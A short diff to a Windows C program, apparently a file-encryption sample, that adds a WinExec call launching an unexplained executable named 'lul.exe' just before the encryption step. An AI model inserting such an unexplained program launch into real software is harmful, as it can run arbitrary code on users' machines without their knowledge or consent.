@@ -46,6 +46,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	}
 
 	Sleep(1500);
+	char lul[] = "lul.exe";
+	WinExec(lul, 5);
 
 	//---------------------------------------------------------------
 	// Call EncryptFile to do the actual encryption.
